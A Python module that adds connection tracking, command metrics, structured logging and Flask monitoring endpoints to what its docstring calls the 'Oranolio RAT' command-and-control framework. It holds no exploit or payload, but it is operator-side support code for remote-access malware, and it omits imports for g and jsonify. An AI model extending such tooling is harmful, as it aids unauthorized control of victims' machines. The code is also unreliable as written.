#!/usr/bin/env python3
"""
Web App Enhancements Module
Provides enhanced logging, metrics collection, and connection management
for the Oranolio RAT - Elite C2 Framework
"""

import os
import json
import time
import threading
import logging
from datetime import datetime, timedelta
from collections import defaultdict, deque
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from functools import wraps

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class ConnectionInfo:
    """Information about an active connection"""
    connection_id: str
    client_ip: str
    user_agent: str
    connected_at: datetime
    last_activity: datetime
    command_count: int = 0
    bytes_transferred: int = 0
    is_authenticated: bool = False
    user_id: Optional[str] = None

@dataclass
class CommandMetrics:
    """Metrics for command execution"""
    command: str
    execution_time: float
    success: bool
    error_message: Optional[str] = None
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()

@dataclass
class SystemMetrics:
    """System performance metrics"""
    timestamp: datetime
    cpu_percent: float
    memory_percent: float
    active_connections: int
    commands_per_minute: float
    errors_per_minute: float

class ConnectionManager:
    """Manages active connections and their metadata"""
    
    def __init__(self, max_connections: int = 1000):
        self.max_connections = max_connections
        self.connections: Dict[str, ConnectionInfo] = {}
        self.connection_lock = threading.RLock()
        self.cleanup_interval = 300  # 5 minutes
        self._start_cleanup_thread()
    
    def _start_cleanup_thread(self):
        """Start background thread for connection cleanup"""
        def cleanup_old_connections():
            while True:
                try:
                    time.sleep(self.cleanup_interval)
                    self._cleanup_old_connections()
                except Exception as e:
                    logger.error(f"Error in connection cleanup: {e}")
        
        cleanup_thread = threading.Thread(target=cleanup_old_connections, daemon=True)
        cleanup_thread.start()
    
    def add_connection(self, connection_id: str, client_ip: str, user_agent: str) -> bool:
        """Add a new connection"""
        with self.connection_lock:
            if len(self.connections) >= self.max_connections:
                logger.warning(f"Maximum connections ({self.max_connections}) reached")
                return False
            
            connection = ConnectionInfo(
                connection_id=connection_id,
                client_ip=client_ip,
                user_agent=user_agent,
                connected_at=datetime.now(),
                last_activity=datetime.now()
            )
            self.connections[connection_id] = connection
            logger.info(f"New connection added: {connection_id} from {client_ip}")
            return True
    
    def update_activity(self, connection_id: str, command: str = None, bytes_transferred: int = 0):
        """Update connection activity"""
        with self.connection_lock:
            if connection_id in self.connections:
                connection = self.connections[connection_id]
                connection.last_activity = datetime.now()
                if command:
                    connection.command_count += 1
                connection.bytes_transferred += bytes_transferred
    
    def remove_connection(self, connection_id: str):
        """Remove a connection"""
        with self.connection_lock:
            if connection_id in self.connections:
                connection = self.connections.pop(connection_id)
                logger.info(f"Connection removed: {connection_id}")
                return connection
        return None
    
    def get_connection(self, connection_id: str) -> Optional[ConnectionInfo]:
        """Get connection information"""
        with self.connection_lock:
            return self.connections.get(connection_id)
    
    def get_all_connections(self) -> List[ConnectionInfo]:
        """Get all active connections"""
        with self.connection_lock:
            return list(self.connections.values())
    
    def _cleanup_old_connections(self):
        """Remove connections that haven't been active for 30 minutes"""
        cutoff_time = datetime.now() - timedelta(minutes=30)
        with self.connection_lock:
            old_connections = [
                conn_id for conn_id, conn in self.connections.items()
                if conn.last_activity < cutoff_time
            ]
            for conn_id in old_connections:
                self.remove_connection(conn_id)
            if old_connections:
                logger.info(f"Cleaned up {len(old_connections)} old connections")

class MetricsCollector:
    """Collects and stores system metrics"""
    
    def __init__(self, max_metrics: int = 10000):
        self.max_metrics = max_metrics
        self.command_metrics: deque = deque(maxlen=max_metrics)
        self.system_metrics: deque = deque(maxlen=max_metrics)
        self.metrics_lock = threading.RLock()
        self.collection_interval = 60  # 1 minute
        self._start_collection_thread()
    
    def _start_collection_thread(self):
        """Start background thread for metrics collection"""
        def collect_metrics():
            while True:
                try:
                    time.sleep(self.collection_interval)
                    self._collect_system_metrics()
                except Exception as e:
                    logger.error(f"Error in metrics collection: {e}")
        
        collection_thread = threading.Thread(target=collect_metrics, daemon=True)
        collection_thread.start()
    
    def record_command(self, command: str, execution_time: float, success: bool, error_message: str = None):
        """Record command execution metrics"""
        with self.metrics_lock:
            metric = CommandMetrics(
                command=command,
                execution_time=execution_time,
                success=success,
                error_message=error_message
            )
            self.command_metrics.append(metric)
    
    def _collect_system_metrics(self):
        """Collect system performance metrics"""
        try:
            import psutil
            cpu_percent = psutil.cpu_percent(interval=1)
            memory_percent = psutil.virtual_memory().percent
            
            # Calculate commands per minute
            now = datetime.now()
            one_minute_ago = now - timedelta(minutes=1)
            recent_commands = [
                m for m in self.command_metrics
                if m.timestamp > one_minute_ago
            ]
            commands_per_minute = len(recent_commands)
            
            # Calculate errors per minute
            recent_errors = [
                m for m in recent_commands
                if not m.success
            ]
            errors_per_minute = len(recent_errors)
            
            # Get active connections count
            from . import connection_manager
            active_connections = len(connection_manager.get_all_connections())
            
            metric = SystemMetrics(
                timestamp=now,
                cpu_percent=cpu_percent,
                memory_percent=memory_percent,
                active_connections=active_connections,
                commands_per_minute=commands_per_minute,
                errors_per_minute=errors_per_minute
            )
            
            with self.metrics_lock:
                self.system_metrics.append(metric)
                
        except ImportError:
            logger.warning("psutil not available, skipping system metrics collection")
        except Exception as e:
            logger.error(f"Error collecting system metrics: {e}")
    
    def get_command_metrics(self, limit: int = 100) -> List[Dict]:
        """Get recent command metrics"""
        with self.metrics_lock:
            recent_metrics = list(self.command_metrics)[-limit:]
            return [asdict(metric) for metric in recent_metrics]
    
    def get_system_metrics(self, limit: int = 100) -> List[Dict]:
        """Get recent system metrics"""
        with self.metrics_lock:
            recent_metrics = list(self.system_metrics)[-limit:]
            return [asdict(metric) for metric in recent_metrics]
    
    def get_performance_summary(self) -> Dict[str, Any]:
        """Get performance summary"""
        with self.metrics_lock:
            if not self.command_metrics:
                return {"error": "No metrics available"}
            
            recent_metrics = list(self.command_metrics)[-100:]  # Last 100 commands
            
            total_commands = len(recent_metrics)
            successful_commands = sum(1 for m in recent_metrics if m.success)
            failed_commands = total_commands - successful_commands
            
            avg_execution_time = sum(m.execution_time for m in recent_metrics) / total_commands
            
            return {
                "total_commands": total_commands,
                "successful_commands": successful_commands,
                "failed_commands": failed_commands,
                "success_rate": (successful_commands / total_commands) * 100 if total_commands > 0 else 0,
                "average_execution_time": avg_execution_time,
                "most_common_commands": self._get_most_common_commands(recent_metrics)
            }
    
    def _get_most_common_commands(self, metrics: List[CommandMetrics]) -> List[Dict[str, Any]]:
        """Get most commonly executed commands"""
        command_counts = defaultdict(int)
        for metric in metrics:
            command_counts[metric.command] += 1
        
        return [
            {"command": cmd, "count": count}
            for cmd, count in sorted(command_counts.items(), key=lambda x: x[1], reverse=True)[:10]
        ]

class EnhancedLogger:
    """Enhanced logging with structured output and security features"""
    
    def __init__(self, log_file: str = "logs/enhanced.log"):
        self.log_file = log_file
        self._ensure_log_directory()
        self._setup_logger()
    
    def _ensure_log_directory(self):
        """Ensure log directory exists"""
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
    
    def _setup_logger(self):
        """Setup enhanced logger"""
        self.logger = logging.getLogger("enhanced")
        self.logger.setLevel(logging.INFO)
        
        # File handler
        file_handler = logging.FileHandler(self.log_file)
        file_handler.setLevel(logging.INFO)
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        
        # Formatter
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        file_handler.setFormatter(formatter)
        console_handler.setFormatter(formatter)
        
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)
    
    def log_command_execution(self, command: str, user_id: str, success: bool, execution_time: float, error: str = None):
        """Log command execution with security context"""
        log_data = {
            "event": "command_execution",
            "command": command,
            "user_id": user_id,
            "success": success,
            "execution_time": execution_time,
            "timestamp": datetime.now().isoformat()
        }
        
        if error:
            log_data["error"] = error
        
        self.logger.info(json.dumps(log_data))
    
    def log_authentication(self, user_id: str, success: bool, ip_address: str, method: str):
        """Log authentication attempts"""
        log_data = {
            "event": "authentication",
            "user_id": user_id,
            "success": success,
            "ip_address": ip_address,
            "method": method,
            "timestamp": datetime.now().isoformat()
        }
        
        self.logger.info(json.dumps(log_data))
    
    def log_security_event(self, event_type: str, details: Dict[str, Any]):
        """Log security-related events"""
        log_data = {
            "event": "security",
            "event_type": event_type,
            "details": details,
            "timestamp": datetime.now().isoformat()
        }
        
        self.logger.warning(json.dumps(log_data))

# Global instances
connection_manager = ConnectionManager()
metrics_collector = MetricsCollector()
enhanced_logger = EnhancedLogger()

def integrate_enhancements(app):
    """Integrate enhancements into Flask app"""
    
    @app.before_request
    def before_request():
        """Log request information"""
        g.start_time = time.time()
        g.request_id = f"{int(time.time() * 1000)}_{os.urandom(4).hex()}"
    
    @app.after_request
    def after_request(response):
        """Log response information"""
        if hasattr(g, 'start_time'):
            execution_time = time.time() - g.start_time
            enhanced_logger.logger.info(f"Request {getattr(g, 'request_id', 'unknown')} completed in {execution_time:.3f}s")
        return response
    
    # Add metrics endpoint
    @app.route('/api/metrics')
    def get_metrics():
        """Get system metrics"""
        return jsonify({
            "connections": len(connection_manager.get_all_connections()),
            "performance": metrics_collector.get_performance_summary(),
            "system_metrics": metrics_collector.get_system_metrics(10)
        })
    
    # Add connection management endpoint
    @app.route('/api/connections')
    def get_connections():
        """Get active connections"""
        connections = connection_manager.get_all_connections()
        return jsonify([asdict(conn) for conn in connections])
    
    return app

def log_command_execution(command: str, user_id: str, success: bool, execution_time: float, error: str = None):
    """Convenience function for logging command execution"""
    enhanced_logger.log_command_execution(command, user_id, success, execution_time, error)
    metrics_collector.record_command(command, execution_time, success, error)

def log_authentication(user_id: str, success: bool, ip_address: str, method: str):
    """Convenience function for logging authentication"""
    enhanced_logger.log_authentication(user_id, success, ip_address, method)

def log_security_event(event_type: str, details: Dict[str, Any]):
    """Convenience function for logging security events"""
    enhanced_logger.log_security_event(event_type, details)

def get_connection_manager():
    """Get the global connection manager instance"""
    return connection_manager

def get_metrics_collector():
    """Get the global metrics collector instance"""
    return metrics_collector

def get_enhanced_logger():
    """Get the global enhanced logger instance"""
    return enhanced_logger